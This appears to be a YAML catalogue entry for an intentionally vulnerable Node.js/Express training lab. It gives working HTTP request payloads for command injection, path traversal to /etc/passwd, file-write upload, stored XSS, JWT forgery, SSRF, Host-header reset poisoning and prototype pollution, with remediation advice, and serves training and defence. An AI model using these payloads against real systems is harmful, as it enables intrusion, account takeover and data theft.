@@ -1,0 +1,332 @@
+id: vt-vulnlab
+
+info:
+  name: "VulnLab - Node.js/Express Training App"
+  author: omarkurt
+  description: |
+    A deliberately vulnerable Node.js/Express application by nospi510 with a single-page
+    interface (in French) that documents each flaw and its payload. It covers OS command
+    injection, local file read, arbitrary file write through upload, IDOR, cookie-based admin
+    access, mass assignment, stored XSS, a JWT signed with a weak secret, blind SSRF, GraphQL
+    introspection, Host header poisoning, prototype pollution and hard-coded secrets. All data
+    is kept in memory.
+  type: Lab
+  difficulty: Easy
+  targets:
+    - nodejs
+    - express
+    - graphql
+  tags:
+    - command-injection
+    - lfi
+    - file-upload
+    - idor
+    - xss
+    - jwt
+    - ssrf
+    - prototype-pollution
+    - graphql
+    - nodejs
+  references:
+    - https://vulnerabletarget.com/VT-vulnlab
+    - https://github.com/nospi510/vulnlab
+
+vulnerabilities:
+  - id: command_injection_ping
+    name: "OS command injection in /api/ping"
+    description: |
+      The host parameter is placed into "ping -c 1 <host>" and run with child_process.exec,
+      so shell metacharacters run extra commands. No session is needed.
+    endpoint: /api/ping
+    method: GET
+    param: host
+    request: |
+      GET /api/ping?host=127.0.0.1%3Bid HTTP/1.1
+      Host: {{Hostname}}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"result":"PING 127.0.0.1 ...\nuid=0(root) gid=0(root) ...","command":"ping -c 1 127.0.0.1;id"}
+  - id: lfi_view
+    name: "Local file read through /api/view"
+    description: |
+      The file parameter is joined to the public directory with path.join and read with
+      fs.readFileSync, so ../ sequences read any file the process can open.
+    endpoint: /api/view
+    method: GET
+    param: file
+    request: |
+      GET /api/view?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1
+      Host: {{Hostname}}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: text/html; charset=utf-8
+
+      root:x:0:0:root:/root:/bin/sh
+  - id: upload_arbitrary_write
+    name: "Arbitrary file write through the upload path"
+    description: |
+      POST /api/upload stores the file in the directory given by the path query parameter
+      and keeps the original file name. The directory is created if it does not exist.
+    endpoint: /api/upload
+    method: POST
+    param: path
+    request: |
+      POST /api/upload?path=/tmp/vtprobe/ HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: multipart/form-data; boundary=vtbnd
+
+      --vtbnd
+      Content-Disposition: form-data; name="file"; filename="vtprobe.txt"
+      Content-Type: text/plain
+
+      VT_UPLOAD_PROBE
+      --vtbnd--
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"message":"File uploaded","path":"/tmp/vtprobe/vtprobe.txt","originalName":"vtprobe.txt","size":15}
+  - id: idor_user_password
+    name: "IDOR on /api/user/:id returns the password"
+    description: |
+      Any user record can be read by id without a session, including the plain-text password.
+    endpoint: /api/user/1
+    method: GET
+    request: |
+      GET /api/user/1 HTTP/1.1
+      Host: {{Hostname}}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"id":1,"username":"admin","password":"admin123","role":"admin","email":"admin@test.com"}
+  - id: cookie_admin
+    name: "Admin access from a client-set cookie"
+    description: |
+      /api/admin/users only checks the isAdmin cookie. Setting isAdmin=true returns every user
+      and password; without it the endpoint answers 403.
+    endpoint: /api/admin/users
+    method: GET
+    param: isAdmin
+    request: |
+      GET /api/admin/users HTTP/1.1
+      Host: {{Hostname}}
+      Cookie: isAdmin=true
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"users":[{"id":1,"username":"admin","password":"admin123",...}],"passwords":["admin123","password"]}
+  - id: mass_assignment_role
+    name: "Mass assignment sets role to admin"
+    description: |
+      /api/user/update copies the whole request body onto the user picked by the userId
+      cookie with Object.assign, so a user can set role to admin.
+    endpoint: /api/user/update
+    method: POST
+    param: role
+    request: |
+      POST /api/user/update HTTP/1.1
+      Host: {{Hostname}}
+      Cookie: userId=2
+      Content-Type: application/json
+
+      {"role":"admin"}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"success":true,"user":{"id":2,"username":"user","password":"password","role":"admin","email":"user@test.com"}}
+  - id: stored_xss_posts
+    name: "Stored XSS in posts"
+    description: |
+      Post titles and content are stored as sent and the page inserts them with innerHTML,
+      so HTML in a post runs in every visitor's browser.
+    endpoint: /api/posts
+    method: POST
+    param: content
+    request: |
+      POST /api/posts HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+
+      {"title":"vt","content":"<img src=x onerror=alert(document.domain)>"}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"success":true,"post":{"id":3,"title":"vt","content":"<img src=x onerror=alert(document.domain)>",...}}
+  - id: jwt_weak_secret
+    name: "JWT signed with a weak hard-coded secret"
+    description: |
+      Tokens are HS256 JWTs signed with "secret-key". Signing {"role":"admin"} with it unlocks
+      the admin response of /api/admin/jwt-verify.
+    endpoint: /api/admin/jwt-verify
+    method: GET
+    param: Authorization
+    request: |
+      GET /api/admin/jwt-verify HTTP/1.1
+      Host: {{Hostname}}
+      Authorization: Bearer {{jwt_hs256_secret-key_role_admin}}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"secret":"FLAG{JWT_MASTER_2024}","decoded":{"username":"x","role":"admin"}}
+  - id: blind_ssrf_fetch
+    name: "Blind SSRF in /api/fetch"
+    description: |
+      The url parameter is fetched by the server without any check. The response body is not
+      returned (the handler fails on response.headers.raw()), but the request is sent, so
+      internal endpoints can be called. The example calls the lab's own cache endpoint, which
+      then reports the key as cached.
+    endpoint: /api/fetch
+    method: GET
+    param: url
+    request: |
+      GET /api/fetch?url=http%3A%2F%2F127.0.0.1%3A3001%2Fapi%2Fcache%3Fkey%3Dvtssrf HTTP/1.1
+      Host: {{Hostname}}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"error":"response.headers.raw is not a function","url":"http://127.0.0.1:3001/api/cache?key=vtssrf"}
+  - id: graphql_introspection_passwords
+    name: "GraphQL introspection and password field"
+    description: |
+      /graphql has introspection and GraphiQL enabled, and the users query returns every
+      password without authentication.
+    endpoint: /graphql
+    method: POST
+    request: |
+      POST /graphql HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+
+      {"query":"{ __schema { types { name } } users { username password } }"}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"data":{"__schema":{...},"users":[{"username":"admin","password":"admin123"},...]}}
+  - id: host_header_reset
+    name: "Password reset link built from the Host header"
+    description: |
+      /api/reset-password builds the reset link from the Host header, so an attacker can make
+      the link point to their own host.
+    endpoint: /api/reset-password
+    method: POST
+    param: Host
+    request: |
+      POST /api/reset-password HTTP/1.1
+      Host: attacker.example
+      Content-Type: application/json
+
+      {"email":"a@b.c"}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"message":"Reset email sent","debug":{"email":"a@b.c","resetLink":"http://attacker.example/reset?token=...","host":"attacker.example"},...}
+  - id: config_secrets
+    name: "Hard-coded secrets in /api/config"
+    description: |
+      /api/config returns a database password and API keys without authentication.
+    endpoint: /api/config
+    method: GET
+    request: |
+      GET /api/config HTTP/1.1
+      Host: {{Hostname}}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"db_host":"localhost","db_user":"root","db_pass":"SuperSecret123","api_keys":{...},...}
+  - id: prototype_pollution_merge
+    name: "Prototype pollution in /api/merge"
+    description: |
+      The recursive merge copies a __proto__ key onto Object.prototype. The polluted value is
+      then visible to every object, for example through the cache lookup. This changes global
+      state; restart the container afterwards.
+    endpoint: /api/merge
+    method: POST
+    param: settings
+    request: |
+      POST /api/merge HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+
+      {"settings":{"__proto__":{"vtpolluted":"VT_PP_PROBE"}}}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"result":{"user":{}},"message":"Settings merged"}
+  - id: unauth_user_delete
+    name: "Unauthenticated user delete"
+    description: |
+      /api/user/delete removes any user by id without a session or CSRF token.
+    endpoint: /api/user/delete
+    method: POST
+    param: userId
+    request: |
+      POST /api/user/delete HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+
+      {"userId":2}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"success":true,"message":"User 2 deleted"}
+
+technical: |
+  The whole app is server.js (Express 5) plus public/index.html. Users, posts and the cache
+  are in-memory objects.
+
+  - /api/ping runs exec(`ping -c 1 ${host}`).
+  - /api/view reads path.join(__dirname, 'public', file) with no check for ../.
+  - /api/upload uses multer diskStorage with destination req.query.path and the original name.
+  - Authorization comes from the userId and isAdmin cookies, which the client sets.
+  - JWTs are signed and verified with the constant 'secret-key'.
+  - /api/merge copies keys recursively without skipping __proto__.
+
+  Advertised by upstream but not working in this build, so not listed above:
+  - The login "SQL injection" only prints a SQL string; the check is an array lookup, and
+    admin' -- returns 401.
+  - XXE: xml2js does not resolve external entities ("Invalid character entity").
+  - alg none: jsonwebtoken 9 rejects it ("jwt signature is required").
+  - SSRF response: the body is never returned (see blind_ssrf_fetch).
+  - CORS: the cors package sends Access-Control-Allow-Origin: * with credentials, which
+    browsers refuse for credentialed requests.
+  - The "NoSQL injection" in the GraphQL search is a plain includes() filter.
+
+impact: |
+  An unauthenticated attacker can run commands as root in the container, read and write any
+  file, read every user's password, become admin by setting a cookie or a JWT, and run script
+  in other users' browsers.
+
+remediation:
+  - "Use execFile with an argument list, or validate host as an IP address or hostname"
+  - "Resolve file paths and reject any that leave the allowed directory"
+  - "Never take the upload directory from the request; generate the stored file name"
+  - "Check authorization on the server from a signed session, not from client cookies"
+  - "Allow-list the fields a user can update"
+  - "Escape output, or use textContent instead of innerHTML"
+  - "Use a long random JWT secret from the environment"
+  - "Restrict outbound URLs for server-side fetches to an allow-list"
+  - "Disable GraphQL introspection and never expose password fields"
+  - "Build absolute links from a configured base URL, not the Host header"
+  - "Skip __proto__, constructor and prototype keys when merging objects"
+
+providers:
+  docker-compose:
+    path: "docker-compose.yaml"
+
+post-install:
+  - "Open http://localhost:3001 (the interface is in French and lists payloads for each flaw)"
+  - "Default users: admin / admin123 and user / password"
+  - "All data is in memory; restart the container to reset users, posts and prototype pollution"
